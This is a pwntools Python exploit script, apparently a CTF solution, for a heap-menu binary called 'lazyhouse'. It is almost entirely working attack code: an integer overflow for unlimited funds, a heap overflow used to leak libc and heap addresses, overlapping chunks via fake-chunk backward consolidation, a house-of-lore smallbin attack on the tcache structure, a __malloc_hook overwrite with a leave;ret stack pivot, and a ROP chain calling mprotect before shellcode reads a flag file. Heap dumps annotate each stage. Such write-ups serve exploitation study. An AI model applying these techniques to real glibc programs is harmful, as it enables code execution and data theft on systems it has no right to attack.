#!/usr/bin/env python3

from pwn import *


elf = ELF('./lazyhouse_patched')
libc = elf.libc


gs = '''
    continue
    handle SIGALRM ignore
'''

context.log_level = 'info'
context.arch='amd64'

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return elf.process()


io = start()

def buy(index, size, house):
    io.sendlineafter(b'Your choice: ', b'1')
    io.sendlineafter(b'Index:', f'{index}'.encode())
    io.sendlineafter(b'Size:', f'{size}'.encode())
    io.sendlineafter(b'House:', house)
    
    return index

def sell(index):
    io.sendlineafter(b'Your choice: ', b'3')
    io.sendlineafter(b'Index:', f'{index}'.encode())

# heap overflow arises in upgrade it reads house->size+0x20 (we can use it twice)

def upgrade(index, house):
    io.sendlineafter(b'Your choice: ', b'4')
    io.sendlineafter(b'Index:', f'{index}'.encode())
    io.sendafter(b'House:', house)

# this allocate memory using malloc(), buy() uses calloc() 

def buy_super(house):
    io.sendlineafter(b':', b'5')
    io.sendlineafter(b':', house)

def infinite_money(size):
    io.sendlineafter(b': ', b'1') # option
    io.sendlineafter(b':', b'0') # index
    io.sendlineafter(b':', f'{size}'.encode()) # this size will trigger int overflow

    sell(0) # selling house adds house's price into our money

#gdb.attach(io, gdbscript=gs)

# get large amount of money

infinite_money(0x12c9fb4d812c9fb+1)

# leak libc and heap with in one shot

'''
    free an unsortedbin chunk, then insert it into the largebin (victim)

    victim->bk and victim->fd points to libc 
    victim->fd_nextsize and victim->bk_nextsize will point to heap

    use show to leak them both since it uses write() it won't stop on null byte

'''


house_A = buy(0, 0xc8, b"AAAA") # 0

house_B = buy(1, 0x500, b"BBBB")

house_C = buy(2, 0xc8, b"CCCC") # prevent consolidation with top chunk

sell(house_B)  # house_B  goes into unsorted bin

house_D = buy(1, 0x600, b'AAAAA')  # house_B goes into largebin

#pause()


upgrade(house_A, b'\x00'*0xc8 + p64(0x513)) # set house_B's IS_MMAPED flag so it won't be zeroed out


house_E = buy(7,0x500 ,b"")


'''
    the heap looks like the following

    [house_A] 0xd0
    [house_E] 0x510  ---> contains libc and heap leak
    [house_C] 0xd0
    [house_D] 0x610
'''

# leak data

io.sendlineafter(b':', b'2')
io.sendlineafter(b':', f'{house_E}'.encode())

leak = io.recv(0x20)

libc.address = u64(leak[0:8]) - 0x3b2000

log.success(f'libc @ 0x{libc.address:02x}')

heap = u64(leak[0x10:0x18]) - 0x320

log.success(f'heap @ 0x{heap:02x}')

# real magic happens here



sell(house_D) # consolidate with top chunk 

sell(house_A) # this 0xd0 chunk goes into tcache

sell(house_C) # this 0xd0 chunk goes into tcache


target = heap+0x910

# fake chunk inside house_F for smallbin unlink attack

house_F = buy(6, 0x80, p64(0x0) + p64(0x231) + p64(target) + p64(target))

house_G = buy(0, 0x88, b'G'*0x10) # 0x90 chunk
house_H = buy(1, 0x88, b'H'*0x10) # 0x90 chunk
house_I = buy(2, 0x88, b'I'*0x10) 


house_J = buy(3, 0x600, b'J'*0x10)


prev_size = 0x230 # fake prev_size equal to fake chunk's size

upgrade(house_I, b'I'*0x80 + p64(prev_size) + p64(0x610)) # write the prev_size and unset prev_inuse

sell(house_J) # trigger backward consolidation with the fake chunk and with top chunk

'''
    now the heap looks like this after backward consolidation (top chunk overlapps house_G, house_H and house_I)

    0x55f84dbc2900	0x0000000000000000	0x0000000000000091	................ <-- house_F
    0x55f84dbc2910	0x0000000000000000	0x00000000000206f1	................ <-- Top chunk
    0x55f84dbc2920	0x000055f84dbc2910	0x000055f84dbc2910	.).M.U...).M.U..
    0x55f84dbc2930	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2940	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2950	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2960	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2970	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2980	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2990	0x0000000000000000	0x0000000000000091	................ <-- house_G
    0x55f84dbc29a0	0x4747474747474747	0x4747474747474747	GGGGGGGGGGGGGGGG
    0x55f84dbc29b0	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc29c0	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc29d0	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc29e0	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc29f0	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2a00	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2a10	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2a20	0x0000000000000000	0x0000000000000091	................ <-- house_H
    0x55f84dbc2a30	0x4848484848484848	0x4848484848484848	HHHHHHHHHHHHHHHH
    0x55f84dbc2a40	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2a50	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2a60	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2a70	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2a80	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2a90	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2aa0	0x0000000000000000	0x0000000000000000	................
    0x55f84dbc2ab0	0x0000000000000000	0x0000000000000091	................ <-- house_I
    0x55f84dbc2ac0	0x4949494949494949	0x4949494949494949	IIIIIIIIIIIIIIII
    0x55f84dbc2ad0	0x4949494949494949	0x4949494949494949	IIIIIIIIIIIIIIII
    0x55f84dbc2ae0	0x4949494949494949	0x4949494949494949	IIIIIIIIIIIIIIII
    0x55f84dbc2af0	0x4949494949494949	0x4949494949494949	IIIIIIIIIIIIIIII
    0x55f84dbc2b00	0x4949494949494949	0x4949494949494949	IIIIIIIIIIIIIIII
    0x55f84dbc2b10	0x4949494949494949	0x4949494949494949	IIIIIIIIIIIIIIII
    0x55f84dbc2b20	0x4949494949494949	0x4949494949494949	IIIIIIIIIIIIIIII
    0x55f84dbc2b30	0x4949494949494949	0x4949494949494949	IIIIIIIIIIIIIIII

'''

# new let's tamper with house_G, house_H, and house_I by allocating a chunk serviced from top chunk


'''
    0 -> in use
    1 
    2 
    3 
    4
    5
    6 -> in use
    7 -> in use
'''


dummy = p64(0)* 15 + p64(0x6c1) +\
        p64(0)* 17 + p64(0x31) +\
        p64(0)* 17 + p64(0x21) +\
        p64(0)* 15



house_K = buy(3, 0x500, dummy) # this tamper with overlapped chunks next we will free them


# freeing those chunks populate their corresponding 

sell(house_H) # 0x31
sell(house_I) # 0x21

sell(house_K) # this will consolidate backward again which allow us for tampering with freed chunks

'''
        [............]
    0x55555555b900	0x0000000000000000	0x0000000000000091	................ <-- house_F
    0x55555555b910	0x0000000000000000	0x00000000000206f1	................ <-- Top chunk
    0x55555555b920	0x0000000000000000	0x0000000000000000	................
    0x55555555b930	0x0000000000000000	0x0000000000000000	................
    0x55555555b940	0x0000000000000000	0x0000000000000000	................
    0x55555555b950	0x0000000000000000	0x0000000000000000	................
    0x55555555b960	0x0000000000000000	0x0000000000000000	................
    0x55555555b970	0x0000000000000000	0x0000000000000000	................
    0x55555555b980	0x0000000000000000	0x0000000000000000	................
    0x55555555b990	0x0000000000000000	0x00000000000006c1	................ <-- house_G
    0x55555555b9a0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9b0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9c0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9d0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9e0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9f0	0x0000000000000000	0x0000000000000000	................
    0x55555555ba00	0x0000000000000000	0x0000000000000000	................
    0x55555555ba10	0x0000000000000000	0x0000000000000000	................
    0x55555555ba20	0x0000000000000000	0x0000000000000031	........1.......
    0x55555555ba30	0x0000000000000000	0x000055555555b010	..........UUUU.. <-- house_H --> tcachebins[0x30][0/1]
    0x55555555ba40	0x0000000000000000	0x0000000000000000	................
    0x55555555ba50	0x0000000000000000	0x0000000000000000	................
    0x55555555ba60	0x0000000000000000	0x0000000000000000	................
    0x55555555ba70	0x0000000000000000	0x0000000000000000	................
    0x55555555ba80	0x0000000000000000	0x0000000000000000	................
    0x55555555ba90	0x0000000000000000	0x0000000000000000	................
    0x55555555baa0	0x0000000000000000	0x0000000000000000	................
    0x55555555bab0	0x0000000000000000	0x0000000000000021	........!.......
    0x55555555bac0	0x0000000000000000	0x000055555555b010	..........UUUU.. <-- house_I -->tcachebins[0x20][0/1]
    0x55555555bad0	0x0000000000000000	0x0000000000000000	................
    0x55555555bae0	0x0000000000000000	0x0000000000000000	................
    0x55555555baf0	0x0000000000000000	0x0000000000000000	................
    0x55555555bb00	0x0000000000000000	0x0000000000000000	................
    0x55555555bb10	0x0000000000000000	0x0000000000000000	................
    0x55555555bb20	0x0000000000000000	0x0000000000000000	................
    0x55555555bb30	0x0000000000000000	0x0000000000000000	................
    0x55555555bb40	0x0000000000000000	0x0000000000000000	................
    0x55555555bb50	0x0000000000000000	0x0000000000000000	................
    0x55555555bb60	0x0000000000000000	0x0000000000000000	................
    0x55555555bb70	0x0000000000000000	0x0000000000000000	................
    0x55555555bb80	0x0000000000000000	0x0000000000000000	................

'''

house_L = buy(1, 0x1a0, p64(0)*15 + p64(0x6c1)) # overwrite house_G size again since calloc() will zero out the chunk userdata

house_M = buy(2, 0x210, b'AAAABBBB') # this will end up on top of house_I and will be used for perform house_of_lore (smallbin variant)

house_N = buy(3, 0x210, p64(0xdeadbeef) + p64(0xdeadbeef))

sell(house_N) # insert it into 0x220 tcache bin

'''
    0x55555555b900	0x0000000000000000	0x0000000000000091	................ <-- house_F
    0x55555555b910	0x0000000000000000	0x00000000000001b1	................ <-- house_L
    0x55555555b920	0x0000000000000000	0x0000000000000000	................
    0x55555555b930	0x0000000000000000	0x0000000000000000	................
    0x55555555b940	0x0000000000000000	0x0000000000000000	................
    0x55555555b950	0x0000000000000000	0x0000000000000000	................
    0x55555555b960	0x0000000000000000	0x0000000000000000	................
    0x55555555b970	0x0000000000000000	0x0000000000000000	................
    0x55555555b980	0x0000000000000000	0x0000000000000000	................
    0x55555555b990	0x0000000000000000	0x00000000000006c1	................ <--house_G
    0x55555555b9a0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9b0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9c0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9d0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9e0	0x0000000000000000	0x0000000000000000	................
    0x55555555b9f0	0x0000000000000000	0x0000000000000000	................
    0x55555555ba00	0x0000000000000000	0x0000000000000000	................
    0x55555555ba10	0x0000000000000000	0x0000000000000000	................
    0x55555555ba20	0x0000000000000000	0x0000000000000000	................
    0x55555555ba30	0x0000000000000000	0x0000000000000000	................ <-- house_H --> tcachebins[0x30][0/1]
    0x55555555ba40	0x0000000000000000	0x0000000000000000	................
    0x55555555ba50	0x0000000000000000	0x0000000000000000	................
    0x55555555ba60	0x0000000000000000	0x0000000000000000	................
    0x55555555ba70	0x0000000000000000	0x0000000000000000	................
    0x55555555ba80	0x0000000000000000	0x0000000000000000	................
    0x55555555ba90	0x0000000000000000	0x0000000000000000	................
    0x55555555baa0	0x0000000000000000	0x0000000000000000	................
    0x55555555bab0	0x0000000000000000	0x0000000000000000	................
    0x55555555bac0	0x0000000000000000	0x0000000000000221	........!....... house_I(tcachebins[0x20][0/1]) , house_M
    0x55555555bad0	0x4242424241414141	0x0000000000000000	AAAABBBB........
    0x55555555bae0	0x0000000000000000	0x0000000000000000	................
    0x55555555baf0	0x0000000000000000	0x0000000000000000	................
    0x55555555bb00	0x0000000000000000	0x0000000000000000	................
    0x55555555bb10	0x0000000000000000	0x0000000000000000	................
    0x55555555bb20	0x0000000000000000	0x0000000000000000	................
    0x55555555bb30	0x0000000000000000	0x0000000000000000	................
    0x55555555bb40	0x0000000000000000	0x0000000000000000	................
    0x55555555bb50	0x0000000000000000	0x0000000000000000	................
    0x55555555bb60	0x0000000000000000	0x0000000000000000	................
    0x55555555bb70	0x0000000000000000	0x0000000000000000	................
    0x55555555bb80	0x0000000000000000	0x0000000000000000	................
    0x55555555bb90	0x0000000000000000	0x0000000000000000	................
    0x55555555bba0	0x0000000000000000	0x0000000000000000	................
    0x55555555bbb0	0x0000000000000000	0x0000000000000000	................
    0x55555555bbc0	0x0000000000000000	0x0000000000000000	................
    0x55555555bbd0	0x0000000000000000	0x0000000000000000	................
    0x55555555bbe0	0x0000000000000000	0x0000000000000000	................
    0x55555555bbf0	0x0000000000000000	0x0000000000000000	................
    0x55555555bc00	0x0000000000000000	0x0000000000000000	................
    0x55555555bc10	0x0000000000000000	0x0000000000000000	................
    0x55555555bc20	0x0000000000000000	0x0000000000000000	................
    0x55555555bc30	0x0000000000000000	0x0000000000000000	................
    0x55555555bc40	0x0000000000000000	0x0000000000000000	................
    0x55555555bc50	0x0000000000000000	0x0000000000000000	................
    0x55555555bc60	0x0000000000000000	0x0000000000000000	................
    0x55555555bc70	0x0000000000000000	0x0000000000000000	................
    0x55555555bc80	0x0000000000000000	0x0000000000000000	................
    0x55555555bc90	0x0000000000000000	0x0000000000000000	................
    0x55555555bca0	0x0000000000000000	0x0000000000000000	................
    0x55555555bcb0	0x0000000000000000	0x0000000000000000	................
    0x55555555bcc0	0x0000000000000000	0x0000000000000000	................
    0x55555555bcd0	0x0000000000000000	0x0000000000000000	................
    0x55555555bce0	0x0000000000000000	0x0000000000000221	........!.......
    0x55555555bcf0	0x0000000000000000	0x000055555555b010	..........UUUU.. <-- tcachebins[0x220][0/1] freed house_N
    0x55555555bd00	0x0000000000000000	0x0000000000000000	................
    0x55555555bd10	0x0000000000000000	0x0000000000000000	................
    0x55555555bd20	0x0000000000000000	0x0000000000000000	................
    0x55555555bd30	0x0000000000000000	0x0000000000000000	................
    0x55555555bd40	0x0000000000000000	0x0000000000000000	................
    0x55555555bd50	0x0000000000000000	0x0000000000000000	................
    0x55555555bd60	0x0000000000000000	0x0000000000000000	................
                    [-----------TRUNCATED-------------]
    0x55555555bec0	0x0000000000000000	0x0000000000000000	................
    0x55555555bed0	0x0000000000000000	0x0000000000000000	................
    0x55555555bee0	0x0000000000000000	0x0000000000000000	................
    0x55555555bef0	0x0000000000000000	0x0000000000000000	................
    0x55555555bf00	0x0000000000000000	0x0000000000020101	................ <-- Top chunk
    0x55555555bf10	0x0000000000000000	0x0000000000000000	................

'''

 


house_O = buy(3, 0x210, b'\x00'*0x148 + p64(0xd1))  # craft a fake 0xd1 chunk right after where house_G ends (0x6c1) so we can be able to free house_G
sell(house_O)



# fill 0x220 tcache bin
for i in range(5):
    buy(3, 0x210, b'A'*0x8)
    sell(3)


# create a fake chunk size in tcache_prethread_struct by allocating a 0x3b0 chunk then freeing it wich leads to increment 0x3b0 tcache bin counts

house_P = buy(3, 0x3a0, b'dummy')
sell(house_P)

'''
pwndbg> vis 1

    0x55aa9f79b000	0x0000000000000000	0x0000000000000251	........Q....... <-- tcache_perthread_struct 
    0x55aa9f79b010	0x0000000000000101	0x0000000002000000	................
    0x55aa9f79b020	0x0000000000000000	0x0000000000000000	................
    0x55aa9f79b030	0x0000000000000007	0x0000000000000000	................
    0x55aa9f79b040	0x0000000000000000	0x0000000000000100	................ <-- fake size by incrementing tcache count
    0x55aa9f79b050	0x000055aa9f79bac0	0x000055aa9f79ba30	..y..U..0.y..U.. <-- fake 0x20 and 0x30 chunk we freed

'''


# house of lore smallbin variant attack (thats why we fill 0x220 tcache bin so this ends up in smallbin)

sell(house_M)


#gdb.attach(io, gdbscript=gs)

house_Q = buy(3, 0x220, b'/home/user/ctf/lazy/flag.txt\x00') # move house_M to smallbin


'''
    0x5615fab64900	0x0000000000000000	0x0000000000000091	................ <-- house_F
    0x5615fab64910	0x0000000000000000	0x00000000000001b1	................ <-- house_L
    0x5615fab64920	0x0000000000000000	0x0000000000000000	................
    0x5615fab64930	0x0000000000000000	0x0000000000000000	................
    0x5615fab64940	0x0000000000000000	0x0000000000000000	................
    0x5615fab64950	0x0000000000000000	0x0000000000000000	................
    0x5615fab64960	0x0000000000000000	0x0000000000000000	................
    0x5615fab64970	0x0000000000000000	0x0000000000000000	................
    0x5615fab64980	0x0000000000000000	0x0000000000000000	................
    0x5615fab64990	0x0000000000000000	0x00000000000006c1	................ <-- house_G
    0x5615fab649a0	0x0000000000000000	0x0000000000000000	................
    0x5615fab649b0	0x0000000000000000	0x0000000000000000	................
    0x5615fab649c0	0x0000000000000000	0x0000000000000000	................
    0x5615fab649d0	0x0000000000000000	0x0000000000000000	................
    0x5615fab649e0	0x0000000000000000	0x0000000000000000	................
    0x5615fab649f0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a00	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a10	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a20	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a30	0x0000000000000000	0x0000000000000000	................ <-- house_H (tcachebins[0x30][0/1])
    0x5615fab64a40	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a50	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a60	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a70	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a80	0x0000000000000000	0x0000000000000000	................
    0x5615fab64a90	0x0000000000000000	0x0000000000000000	................
    0x5615fab64aa0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64ab0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64ac0	0x0000000000000000	0x0000000000000221	........!....... <-- house_I (tcachebins[0x20][0/1]) , house_M (smallbins[0x220][0])
    0x5615fab64ad0	0x00007f70789b1eb0	0x00007f70789b1eb0	...xp......xp...
    0x5615fab64ae0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64af0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b00	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b10	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b20	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b30	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b40	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b50	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b60	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b70	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b80	0x0000000000000000	0x0000000000000000	................
    0x5615fab64b90	0x0000000000000000	0x0000000000000000	................
    0x5615fab64ba0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64bb0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64bc0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64bd0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64be0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64bf0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c00	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c10	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c20	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c30	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c40	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c50	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c60	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c70	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c80	0x0000000000000000	0x0000000000000000	................
    0x5615fab64c90	0x0000000000000000	0x0000000000000000	................
    0x5615fab64ca0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64cb0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64cc0	0x0000000000000000	0x0000000000000000	................
    0x5615fab64cd0	0x0000000000000000	0x0000000000000000	................
                    [0x220 chunk] * 7  --> tcache 0x220
                    [0x3b0 chunk]      --> tcache 0x3b0     ---> creates a fake size in per_thread_cache (0x100)
    0x5615fab65f70	0x0000000000000000	0x0000000000000231	........1....... <-- moves house_M to smallbin
    0x5615fab65f80	0x6168616861686168	0x0000000000006168	hahahahaha......
    0x5615fab65f90	0x0000000000000000	0x0000000000000000	................
    0x5615fab65fa0	0x0000000000000000	0x0000000000000000	................
    0x5615fab65fb0	0x0000000000000000	0x0000000000000000	................
    0x5615fab65fc0	0x0000000000000000	0x0000000000000000	................
    0x5615fab65fd0	0x0000000000000000	0x0000000000000000	................
    0x5615fab65fe0	0x0000000000000000	0x0000000000000000	................
    0x5615fab65ff0	0x0000000000000000	0x0000000000000000	................
    0x5615fab66000	0x0000000000000000	0x0000000000000000	................
                    [top_chunk] 
'''

# now let's free house_G so we are able to allocate it again so we can tamper with overlapped chunk

sell(house_G)


'''
    if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
          if (__glibc_unlikely (bck->fd != victim)) ---> check we need to bypass for house_of_lore
            malloc_printerr ("malloc(): smallbin double linked list corrupted");
          
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

'''


tcache_per_thread = heap+0x40 # fake chunk in tcache_per_thread struct
small_bin = libc.address + 0x3b1eb0

payload = p64(0)*19 + p64(0x31) +\
        p64(tcache_per_thread) + p64(0)*16 +\
        p64(0x221) + p64(small_bin) + p64(tcache_per_thread)

house_R = buy(0, 0x6b0, payload)




#gdb.attach(io , gdbscript=gs)



flag = heap+0x1f80 # /home/user/ctf/lay/flag.txt

leave_ret = libc.address + 0xc2169 # leave; ret

pop_rax_ret = libc.address + 0x0000000000037ab8 # pop rax; ret

pop_rdi_ret = libc.address + 0x0000000000021962 # pop rdi ; ret

pop_rsi_ret = libc.address + 0x0000000000022332 # pop rsi; ret

pop_rdx_ret = libc.address + 0x0000000000001b9a # pop rdx; ret

syscall = libc.address + 0x000000000000275b

ret = libc.address + 0x00000000000008aa # ret


pivot = heap+0xad0

'''
    int open(const char *pathname, int flags);
    ssize_t read(int fd, void *buf, size_t count);
    ssize_t write(int fd, const void *buf, size_t count);


    int mprotect(void *addr, size_t len, int prot);

'''

shellcode = f'''
        mov rdi, 0x{flag:02x}
        mov rsi, 0x0
        mov rax, SYS_open
        syscall

        mov rdi, 0x3
        mov rsi, 0x{heap:02x}
        mov rdx, 0x100
        mov rax, SYS_read
        syscall

        mov rdi, 0x1
        mov rsi, 0x{heap:02x}
        mov rdx, 0x20
        mov rax, SYS_write
        syscall
'''

rop = p64(0xdeadbeef) +\
        p64(pop_rdi_ret) + p64(heap) +\
        p64(pop_rsi_ret) + p64(0xdeadbeef) +\
        p64(pop_rdx_ret) + p64(0x7) +\
        p64(ret) + p64(libc.sym.mprotect) + p64(ret) + p64(heap+0xb28) +\
        asm(shellcode)
        

'''
    RDI --> first arg
    RSI --> second arg
    RDX --> third arg

'''


house_S = buy(2, 0x210, rop) # store rop chain here

house_T = buy(4, 0x210, p64(0x0)*32 + p64(libc.sym.__malloc_hook))

super_house = buy_super(p64(leave_ret))


'''
    leave; retn;  ---->  mov esp, ebp; pop ebp ; retn

    __libc_calloc :

                                       mov     rdx, rdi
.text:000000000009A033                 push    r14
.text:000000000009A035                 mov     eax, 0FFFFFFFFh
.text:000000000009A03A                 push    r13
.text:000000000009A03C                 or      rdx, rsi
.text:000000000009A03F                 push    r12
.text:000000000009A041                 push    rbp
.text:000000000009A042                 mov     rbp, rdi    ------>  rdi -> count argument
.text:000000000009A045                 push    rbx
.text:000000000009A046                 imul    rbp, rsi    ------> rsi -> size argument
.text:000000000009A04A                 cmp     rdx, rax
.text:000000000009A04D                 jbe     short loc_9A058
.text:000000000009A04F                 test    rsi, rsi
.text:000000000009A052                 jnz     loc_9A258
.text:000000000009A058
.text:000000000009A058 loc_9A058:                              ; CODE XREF: calloc+1D↑j
.text:000000000009A058                                         ; calloc+233↓j
.text:000000000009A058                 mov     rax, cs:__malloc_hook_ptr
.text:000000000009A05F                 mov     rax, [rax]
.text:000000000009A062                 test    rax, rax
.text:000000000009A065                 jnz     loc_9A2C0
                        ...............

.text:000000000009A2C0 loc_9A2C0:                              ; CODE XREF: calloc+35↑j
.text:000000000009A2C0                 mov     rsi, [rsp+28h]
.text:000000000009A2C5                 mov     rdi, rbp
.text:000000000009A2C8                 call    rax   -------> call __malloc_hook

so if we overwrite __malloc_hook with leave; retn ptr and invoke calloc(1, 0xdeadbeef) with 0xdeadbeef in size and 1 in count the leave; retn ptr will pivot the stack to the 0xdeadbeef address and we can write our rop chain there
'''

#pause()
#house_Z = buy(5, pivot, b'')

io.sendlineafter(b'Your choice: ', b'1')
io.sendlineafter(b'Index:', b'5')
io.sendlineafter(b'Size:', f'{pivot}'.encode())

io.recvuntil(b'Price:5415557892635409710')

io.interactive()